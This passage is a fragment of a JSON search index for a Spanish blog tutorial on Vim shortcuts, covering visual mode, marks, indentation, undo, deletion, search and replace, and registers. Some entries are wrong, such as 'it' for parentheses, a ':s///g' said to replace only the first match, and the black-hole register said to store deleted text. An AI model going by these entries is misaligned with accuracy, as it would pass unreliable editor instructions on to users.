visual.\nUtiliza los cursores o las teclas ‘j’, ‘k’, ‘h’ y ‘l’ para seleccionar el texto que deseas copiar, cortar o eliminar.\nSi quieres copiar el texto seleccionado, simplemente presiona la tecla ‘y’. Si prefieres cortarlo, presiona ‘d’. Y si deseas eliminarlo por completo, usa la tecla ‘x’.\n¡Listo! Ahora puedes pegar el texto donde desees. Para ello, sal del modo visual y vuelve al modo normal, y luego presiona la tecla ‘p’."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#mover-una-línea-de-posición",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#mover-una-línea-de-posición",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Mover una línea de posición",
    "text": "Mover una línea de posición\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n:.-1m.+1\nMueve la línea justo encima de la línea actual a la línea inferior justo después de la línea actual.\n\n\n:19m17\nMueve la línea 19 a la posición de la línea 17.\n\n\n:.-4,.-2m.+8\nMueve las líneas desde 4 líneas antes de la actual hasta 2 líneas antes de la actual, a una posición 8 líneas después de la posición actual del cursor."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#modo-visual",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#modo-visual",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Modo Visual",
    "text": "Modo Visual\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\nv\nAccede al modo visual.\n\n\nV\nInicia el modo visual seleccionando toda una línea.\n\n\nCtrl + v\nInicia el modo Bloque visual."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#selección-de-palabras",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#selección-de-palabras",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Selección de Palabras",
    "text": "Selección de Palabras\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\niw\nSelecciona la palabra donde se encuentra el cursor.\n\n\naw\nSelecciona la palabra donde se encuentra el cursor, incluyendo el espacio que la precede."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#selección-de-bloques",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#selección-de-bloques",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Selección de Bloques",
    "text": "Selección de Bloques\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\nab\nSelecciona un bloque de texto delimitado por paréntesis (). La selección incluye los paréntesis.\n\n\nit\nSelecciona un bloque de texto delimitado por paréntesis (). La selección no incluye los paréntesis.\n\n\naB\nSelecciona un bloque de texto delimitado por corchetes {}. La selección incluye los corchetes.\n\n\niB\nSelecciona un bloque de texto delimitado por corchetes {}. La selección no incluye los corchetes.\n\n\nat\nSelecciona un bloque de texto delimitado por etiquetas &lt;&gt; y &lt;/&gt; incluyendo las etiquetas.\n\n\nit\nSelecciona un bloque de texto delimitado por etiquetas &lt;&gt; y &lt;/&gt; sin incluir las etiquetas."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#otras-acciones",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#otras-acciones",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Otras Acciones",
    "text": "Otras Acciones\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\no\nMueve el cursor a la parte inicial de un bloque delimitado por (), {}, &lt;&gt;..&lt;/&gt;\n\n\nO\nMueve el cursor a la parte final de un bloque delimitado por (), {}, &lt;&gt;..&lt;/&gt;\n\n\nj\nSelecciona una frase entera y se mueve a la siguiente línea.\n\n\nis\nSelecciona una frase hasta el primer punto.\n\n\nip\nSelecciona un párrafo completo.\n\n\nb\nSelecciona desde el cursor hasta el inicio de la palabra.\n\n\ne\nSelecciona desde el cursor hasta el final de la palabra.\n\n\n$\nSelecciona desde el cursor hasta el final de la línea.\n\n\n^\nSelecciona desde el cursor hasta el primer carácter imprimible de la línea.\n\n\nawd$p\nSelecciona una palabra y la mueve al final de un párrafo.\n\n\nu\nTransforma todo el texto seleccionado en minúsculas.\n\n\nU\nTransforma todo el texto seleccionado en mayúsculas.\n\n\n&gt;\nMueve la línea en la que se encuentra el cursor a la derecha. (Aplica sangría al texto.)\n\n\n&lt;\nMueve la línea en la que se encuentra el cursor a la izquierda. (Aplica sangría al texto.)\n\n\nEsc\nSale del modo visual."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#crear-marcas",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#crear-marcas",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Crear Marcas",
    "text": "Crear Marcas\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\nm + [a-z]\nCrea una marca local con el nombre especificado. Puedes usar letras de a a z."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#trabajar-con-marcas",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#trabajar-con-marcas",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Trabajar con Marcas",
    "text": "Trabajar con Marcas\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n[a-z]\nPosiciona el cursor en la marca especificada. Utiliza la letra correspondiente.\n\n\n'\nRegresa al inicio de la línea en la que se creó la marca.\n\n\n`a\nMueve el cursor al inicio de la línea en la que se creó la marca.\n\n\n`\nSalta a la marca anterior. Si estás en la marca b, te trasladarás a la marca a."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#eliminar-marcas",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#eliminar-marcas",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Eliminar Marcas",
    "text": "Eliminar Marcas\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n:delmarks a\nElimina la marca especificada (en este ejemplo, la marca a).\n\n\n:delmarks!\nElimina todas las marcas locales o minúsculas del fichero.\n\n\n:delmarks a-d\nElimina todas las marcas desde la marca a hasta la marca d.\n\n\n:delmarks aBc\nElimina las marcas especificadas (en este ejemplo, las marcas a, B y c).\n\n\n\nNota: Si asignamos una marca con letras minúsculas, esta será una marca local y solo estará disponible mientras el fichero esté abierto. Si deseamos que la marca sea permanente, debemos asignarla con letras mayúsculas, creando así marcas globales."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#aplicar-sangrías",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#aplicar-sangrías",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Aplicar Sangrías",
    "text": "Aplicar Sangrías\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n&gt;&gt;\nSangra el texto hacia la derecha.\n\n\n3 &gt;&gt;\nRealiza un sangrado en 3 líneas a partir de la posición actual."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#deshacer-sangría",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#deshacer-sangría",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Deshacer Sangría",
    "text": "Deshacer Sangría\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n&lt;&lt;\nDeshace la sangría, moviendo el texto hacia la izquierda."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#pegar-y-ajustar-a-la-sangría-actual",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#pegar-y-ajustar-a-la-sangría-actual",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Pegar y Ajustar a la Sangría Actual",
    "text": "Pegar y Ajustar a la Sangría Actual\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n]p\nPega el contenido del portapapeles y lo ajusta a la sangría actual."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#aplicar-sangría-en-modo-visual",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#aplicar-sangría-en-modo-visual",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Aplicar Sangría en Modo Visual",
    "text": "Aplicar Sangría en Modo Visual\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\nv + j + &gt;\nSelecciona una frase en modo visual y la sangra hacia la derecha."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#aplicar-sangría-en-modo-insertar",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#aplicar-sangría-en-modo-insertar",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Aplicar Sangría en Modo Insertar",
    "text": "Aplicar Sangría en Modo Insertar\n\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n\nCtrl+t\nAplica una sangría moviendo el texto hacia la derecha en modo insertar.\nX\n\n\nCtrl+d\nAplica una sangría moviendo el texto hacia la izquierda en modo insertar."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#deshacer-cambios",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#deshacer-cambios",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Deshacer Cambios",
    "text": "Deshacer Cambios\n\n\n\n\n\n\n\nShortcuts or commands o comando\nFunción\n\n\n\n\nu\nDeshace el último cambio realizado.\n\n\n2u\nDeshace los 2 últimos cambios realizados."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#restaurar-cambio",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#restaurar-cambio",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Restaurar Cambio",
    "text": "Restaurar Cambio\n\n\n\n\n\n\n\nShortcuts or commands o comando\nFunción\n\n\n\n\nU\nRestaura la última línea modificada. No se puede rehacer el cambio después de restaurarlo."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#rehacer-cambios",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#rehacer-cambios",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Rehacer Cambios",
    "text": "Rehacer Cambios\n\n\n\n\n\n\n\nShortcuts or commands o comando\nFunción\n\n\n\n\nCtrl + r or :redo\nRehace el último cambio realizado.\n\n\n3 + Ctrl + r\nRehace los últimos 3 cambios deshechos."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#deshacer-y-rehacer-por-tiempo",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#deshacer-y-rehacer-por-tiempo",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Deshacer y Rehacer por Tiempo",
    "text": "Deshacer y Rehacer por Tiempo\n\n\n\n\n\n\n\nShortcuts or commands o comando\nFunción\n\n\n\n\n:earlier 1h\nDeshace todos los cambios realizados en la última hora.\n\n\n:later 30m\nRehace los cambios realizados en la última media hora."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#eliminar-caracteres",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#eliminar-caracteres",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Eliminar Caracteres",
    "text": "Eliminar Caracteres\n\n\n\n\n\n\n\nShortcuts or commands o comando\nFunción\n\n\n\n\nx\nElimina un carácter en modo normal.\n\n\n3x\nElimina 3 caracteres a partir de donde está el cursor.\n\n\nX\nBorra un carácter a la izquierda del cursor.\n\n\nr\nReemplaza un carácter.\n\n\ns\nElimina un carácter y cambia al modo insertar."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#eliminar-palabras",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#eliminar-palabras",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Eliminar Palabras",
    "text": "Eliminar Palabras\n\n\n\n\n\n\n\nShortcuts or commands o comando\nFunción\n\n\n\n\ndw\nBorra la palabra desde el cursor hasta el final.\n\n\ncw\nBorra la palabra desde el cursor hasta el final y cambia al modo insertar.\n\n\ndiw\nBorra la palabra completa bajo el cursor.\n\n\nciw\nBorra la palabra completa bajo el cursor y cambia al modo insertar."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#eliminar-líneas",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#eliminar-líneas",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Eliminar Líneas",
    "text": "Eliminar Líneas\n\n\n\n\n\n\n\nShortcuts or commands o comando\nFunción\n\n\n\n\ndd\nBorra/corta una línea completa.\n\n\nshift + d\nBorra desde el cursor hasta el final de la línea.\n\n\nd0\nBorra desde el cursor hasta el inicio de la línea.\n\n\ncc o S\nBorra toda la línea y cambia al modo insertar.\n\n\nshift + c\nBorra desde el cursor hasta el final de la línea y cambia al modo insertar.\n\n\nc0\nBorra desde el cursor hasta el inicio de la línea y cambia al modo insertar.\n\n\n2dd\nBorra/corta 2 líneas a partir de donde está el cursor.\n\n\n2cc\nBorra/corta 2 líneas a partir de donde está el cursor y cambia al modo insertar."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#eliminar-por-patrón",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#eliminar-por-patrón",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Eliminar por Patrón",
    "text": "Eliminar por Patrón\n\n\n\n\n\n\n\nShortcuts or commands o comando\nFunción\n\n\n\n\n:%d\nBorra todas las líneas del archivo.\n\n\ndgg\nBorra desde el cursor hasta el inicio del archivo.\n\n\ndG\nBorra desde el cursor hasta el final del archivo.\n\n\n:[2],[4]\nBorra las líneas de la 2 a la 4.\n\n\n:1,.-1d\nBorra todas las líneas antes de la línea actual.\n\n\n:.+1,$d\nBorra todas las líneas después de la línea actual.\n\n\n:g/&lt;patrón&gt;/d\nBorra todas las líneas que contienen un patrón específico.\n\n\n:g!/&lt;patrón&gt;/d\nBorra todas las líneas que no contienen un patrón específico.\n\n\n:g/^A/d\nBorra todas las líneas que comienzan con la letra A.\n\n\n:g/^$/d\nBorra todas las líneas vacías en el documento.\n\n\n:.-2,.+8d\nBorra las líneas desde 2 líneas encima hasta 8 líneas debajo de la posición actual.\n\n\n\n¡Hay otra forma de eliminar texto en Vim utilizando el modo visual!\nSi quieres utilizar marcas para eliminar texto, simplemente sigue estos pasos:\n\nVe a la primera línea que deseas borrar y crea una marca, por ejemplo, presiona ma.\nLuego, coloca el cursor en la última línea que deseas eliminar.\nFinalmente, presiona d'a y todas las líneas desde la posición actual del cursor hasta la línea marcada con la marca a se eliminarán.\n\nPor otro lado, si prefieres eliminar texto en el modo visual, puedes consultar el apartado de “Atajos de teclado para copiar y pegar texto en Vim”. ¡Es una forma rápida y eficiente de seleccionar y eliminar el texto que desees!"
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#búsqueda-de-texto-o-frase",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#búsqueda-de-texto-o-frase",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Búsqueda de texto o frase",
    "text": "Búsqueda de texto o frase\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n/palabra_a_buscar\nPresionar / seguido del texto que deseas buscar te lleva a la primera aparición de ese texto en el archivo.\n\n\nn\nPresionar n te lleva a la siguiente aparición de la búsqueda realizada previamente.\n\n\nN\nPresionar N te lleva a la aparición anterior de la búsqueda realizada previamente.\n\n\n?palabra_a_busca\nBusca todas las palabras que contienen un texto determinado y coloca el cursor en la primera ocurrencia anterior a la ubicación actual del cursor.\n\n\nn\nDespués de realizar una búsqueda, “n” lleva al siguiente resultado de búsqueda.\n\n\nShift+n\nSimilar a “n”, pero se desplaza hacia atrás en los resultados de búsqueda.\n\n\nggn\nVa a la primera aparición de la palabra buscada.\n\n\nGn\nVa a la última aparición de la palabra buscada.\n\n\n3/palabra_a_busca\nBuscará todas las palabras que contengan “palabra_a_busca” y colocará el cursor en la tercera ocurrencia."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#navegación-entre-coincidencias-de-búsqueda",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#navegación-entre-coincidencias-de-búsqueda",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Navegación entre coincidencias de búsqueda",
    "text": "Navegación entre coincidencias de búsqueda\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n*\nPresionar * te lleva a la siguiente aparición de la palabra en la que se encuentra el cursor.\n\n\n#\nPresionar # te lleva a la aparición anterior de la palabra en la que se encuentra el cursor."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#reemplazo-de-texto",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#reemplazo-de-texto",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Reemplazo de texto",
    "text": "Reemplazo de texto\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n:%s/buscar/reemplazar/g\nPresionar :%s/buscar/reemplazar/g te permite reemplazar todas las apariciones de “buscar” por “reemplazar” en todo el archivo.\n\n\n:s/buscar/reemplazar/g\nPresionar :s/buscar/reemplazar/g te permite reemplazar solo la primera aparición de “buscar” por “reemplazar” en la línea actual."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#reemplazo-de-caracteres",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#reemplazo-de-caracteres",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Reemplazo de caracteres",
    "text": "Reemplazo de caracteres\n\n\n\n\n\n\n\nShortcuts or commands o fórmula\nFunción\n\n\n\n\nr\nPermite reemplazar un carácter cuando estás en modo normal.\n\n\nR\nActiva el modo de reemplazo para cambiar los caracteres deseados. No saldrás del modo de reemplazo hasta que presiones la tecla ESC.\n\n\nró\nReemplaza la letra señalada por el cursor por “ó”.\n\n\n10ró\nReemplaza las 10 letras a partir de la posición actual del cursor por “ó”."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#búsqueda-y-reemplazo-de-palabras",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#búsqueda-y-reemplazo-de-palabras",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Búsqueda y reemplazo de palabras",
    "text": "Búsqueda y reemplazo de palabras\n\n\n\n\n\n\n\nShortcuts or commands o fórmula\nFunción\n\n\n\n\n:s/achalma/Achalma\nReemplaza todas las palabras que contienen “achalma” por “Achalma” solo en la línea actual.\n\n\n:s/achalma/Achalma/g\nReemplaza todas las palabras que contienen “achalma” por “Achalma” en la línea del cursor sin pedir confirmación.\n\n\n:%s/achalma/Achalma/g\nReemplaza todas las palabras que contienen “achalma” por “Achalma” en todo el documento sin pedir confirmación.\n\n\n:%s/achalma/Achalma/gc\nReemplaza todas las ocurrencias de “achalma” por “Achalma” en el archivo pidiendo confirmación.\n\n\n:%s!Achalma!ubuntu/scripts!gi\nReemplaza todas las palabras que contienen “Achalma” por “ubuntu/scripts” utilizando el delimitador “!” y sin distinguir entre mayúsculas y minúsculas.\n\n\n:%s/\\&lt;geek\\&gt;/Linux/gc\nReemplaza la palabra exacta “geek” por “Linux” en todo el documento pidiendo confirmación."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#búsqueda-y-reemplazo-en-rangos-específicos",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#búsqueda-y-reemplazo-en-rangos-específicos",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Búsqueda y reemplazo en rangos específicos",
    "text": "Búsqueda y reemplazo en rangos específicos\n\n\n\n\n\n\n\nShortcuts or commands o fórmula\nFunción\n\n\n\n\n:5,12s/foo/bar/g\nCambia “foo” por “bar” entre las líneas 5 y 12 (ambas incluidas).\n\n\n:'a,'bs/foo/bar/g\nCambia “foo” por “bar” entre las marcas “a” y “b”.\n\n\n:22s/Linux/Achalma/I\nReemplaza todas las palabras que contienen “Linux” por “Achalma” en la línea 22, distinguiendo entre mayúsculas y minúsculas.\n\n\n:.s/Achalma/Linux/I\nReemplaza todas las palabras que contienen “Achalma” por “Linux” en la línea actual, distinguiendo entre mayúsculas y minúsculas."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#transformación-de-texto",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#transformación-de-texto",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Transformación de texto",
    "text": "Transformación de texto\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\ng+u+u\nTransforma una frase completa a minúsculas.\n\n\ng+U+U\nTransforma una frase completa a mayúsculas."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#símbolos-para-especificar-rangos",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#símbolos-para-especificar-rangos",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Símbolos para especificar rangos",
    "text": "Símbolos para especificar rangos\n\n\n\n\n\n\n\nSímbolo\nSignificado\n\n\n\n\n%\nAplica la acción a todo el documento\n\n\n$\nAplica la acción a la última línea del documento\n\n\n.\nRepresenta la línea actual en la que se encuentra el cursor"
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#especificación-de-rangos-mediante-marcas-y-números-de-línea",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#especificación-de-rangos-mediante-marcas-y-números-de-línea",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Especificación de rangos mediante marcas y números de línea",
    "text": "Especificación de rangos mediante marcas y números de línea\n\n\n\n\n\n\n\nRango\nSignificado\n\n\n\n\n'a,'b\nBloque de líneas entre las marcas ‘a’ y ‘b’\n\n\n:17,20d\nBorra las líneas 17, 18, 19 y 20\n\n\n:.-2,.+8y\nCopia el contenido desde 2 líneas encima hasta 8 líneas debajo"
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#mostrar-y-gestionar-los-registros",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#mostrar-y-gestionar-los-registros",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Mostrar y gestionar los registros",
    "text": "Mostrar y gestionar los registros\n\n\n\n\n\n\n\nShortcuts or commands\nFunción\n\n\n\n\n:registers o :reg\nMuestra el contenido almacenado en cada uno de los 48 registros o portapapeles de Vim.\n\n\n\"1yy\nCopia la línea actual al registro numérico 1.\n\n\n\"1p\nPega el contenido del registro numérico 1.\n\n\n\"ayy\nCopia la línea actual al registro nominal a. Si utilizas “a” en minúscula, se borrará completamente el contenido anterior del portapapeles a.\n\n\n\"Ayy\nAñade la línea actual al registro nominal a. Si utilizas “A” en mayúscula, el contenido previamente guardado en a no se borrará, sino que se añadirá.\n\n\n\"ap\nPega el contenido del registro nominal a.\n\n\n:registers a o :reg a\nMuestra el contenido guardado en el registro a.\n\n\n:reg 4c\nMuestra el contenido almacenado en el registro numérico 4 y el registro nominal c.\n\n\n\"+yy\nCopia la línea actual al portapapeles del sistema operativo.\n\n\n\"+p\nPega el contenido almacenado en el portapapeles del sistema operativo en el documento que estás editando en Vim.\n\n\n\"*p\nPega el texto seleccionado en tu navegador u otro software de tu sistema operativo. No es necesario que el texto esté copiado en el portapapeles del sistema.\n\n\nCtrl+r+a\nPega el contenido del registro a mientras estás en modo de inserción de texto.\n\n\nCtrl+r \"\nPega el contenido del registro predeterminado del portapapeles de Vim en modo de inserción.\n\n\nCtrl+r +\nPega el contenido almacenado en el portapapeles del sistema operativo en modo de inserción.\n\n\nCtrl+r *\nPega el texto seleccionado en cualquier aplicación de tu sistema operativo en el modo de inserción de texto. No es necesario que el texto esté copiado en el portapapeles del sistema.\n\n\n\nNota: Hay 26 registros nominales, desde “a” hasta “z”."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#registros-numéricos",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#registros-numéricos",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Registros numéricos",
    "text": "Registros numéricos\n\n\n\n\n\n\n\nShortcuts or commands\n¿Qué hacen?\n\n\n\n\n\"0yy\nCopia la línea actual al registro numérico 0.\n\n\n\"0p\nPega el contenido del registro numérico 0.\n\n\n\"2yy\nCopia la línea actual al registro numérico 2.\n\n\n\"2p\nPega el contenido del registro numérico 2.\n\n\n…\n…\n\n\n\"9yy\nCopia la línea actual al registro numérico 9.\n\n\n\"9p\nPega el contenido del registro numérico 9."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#registros-de-lectura",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#registros-de-lectura",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Registros de lectura",
    "text": "Registros de lectura\n\n\n\nRegistro\nContenido almacenado\n\n\n\n\n\":\nGuarda el último comando ejecutado.\n\n\n\"%\"\nContiene la ruta del archivo de Vim que estás editando.\n\n\n\".\"\nContiene el último texto insertado.\n\n\n\nEstos registros de lectura te permiten acceder a información relevante, como el último comando ejecutado, la ruta del archivo en edición y el último texto insertado. Puedes utilizar estos registros en tus flujos de trabajo de Vim para mejorar tu productividad."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#registros-especiales",
    "href": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#registros-especiales",
    "title": "Domina las habilidades de edición de texto en Vim, una guía completa para maximizar tu productividad",
    "section": "Registros especiales",
    "text": "Registros especiales\n\n\n\n\n\n\n\nRegistro\nContenido almacenado\n\n\n\n\n\"_\"\nEs el registro del “agujero negro”. Cuando eliminamos una palabra usando el atajo “_diw”,\n\n\n\nla palabra borrada se almacenará en este registro y el registro por defecto \"\" quedará vacío.\n\n\n\":\"\nAlmacena el último comando ejecutado.\n\n\n\"-\"\nContiene el contenido que hemos borrado o modificado y no es mayor a una línea de longitud.\n\n\n\"\\\nGuarda el contenido de la última búsqueda.\n\n\n\"=\nPermite realizar operaciones matemáticas en Vim. Por ejemplo, puedes hacer una suma como =2+2\n\n\n\nen modo normal y luego pegar el resultado con la tecla p.\n\n\n\nEstos registros especiales en Vim ofrecen funcionalidades adicionales, como el registro del “agujero negro” para evitar que palabras borradas se almacenen en el registro por defecto, el almacenamiento del último comando ejecutado y el contenido borrado o modificado. También puedes realizar operaciones matemáticas y acceder al contenido de la última búsqueda.\nRecuerda que todos los registros de Vim se almacenan permanentemente en el archivo ~/.viminfo, lo que significa que no se borran al cerrar Vim. Esto te permite mantener tus registros guardados y acceder a ellos en sesiones posteriores."
  },
  {
    "objectID": "operating-system/2023-07-01-atajos-de-teclado-y-comandos-para-usar-vim/index.html#apertura-de-archivos",
